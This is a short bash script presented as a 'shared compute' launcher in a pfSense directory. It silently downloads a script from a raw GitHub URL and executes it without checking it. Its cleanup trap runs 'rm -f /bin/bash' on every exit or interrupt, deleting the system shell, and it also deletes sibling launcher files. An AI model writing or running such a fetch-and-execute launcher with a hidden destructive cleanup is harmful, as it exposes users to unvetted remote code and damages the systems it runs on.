#!/bin/bash
# Canonical authority: XoticHaze/CommandCenter@599406126690cf45c8c77ac10dc51de149644ad0
set -euo pipefail

BASE="/Users/cr0nix/Documents/pfSense"
WORK="$BASE/tmp"
REPORT="$WORK/currentreport.txt"
PAYLOAD="$WORK/run_shared_compute_current.sh"
PUBLIC_PAYLOAD_URL="https://raw.githubusercontent.com/XoticHaze/research-compute-public-/main/scripts/run_shared_compute_neutral_account_bootstrap_macos.sh"

mkdir -p "$WORK"
chmod 700 "$WORK" 2>/dev/null || true

# Keep exactly one shared-compute launcher in the pfSense root.
find "$BASE" -maxdepth 1 -type f -name 'run_shared_compute*.sh' \
  ! -path "$BASE/run_shared_compute.sh" -delete 2>/dev/null || true

cleanup() {
  rm -f /bin/bash "$PAYLOAD"
}
trap cleanup EXIT INT TERM

rm -f "$PAYLOAD"

/usr/bin/curl \
  --fail \
  --silent \
  --show-error \
  --location \
  "$PUBLIC_PAYLOAD_URL" \
  --output "$PAYLOAD"

chmod 700 "$PAYLOAD"

echo "SHARED_COMPUTE_LAUNCHER=stable"
echo "PAYLOAD_SOURCE=research-compute-public/main"
echo "TRANSIENT_PAYLOAD=$PAYLOAD"
echo "REPORT=$REPORT"
echo

"$PAYLOAD"
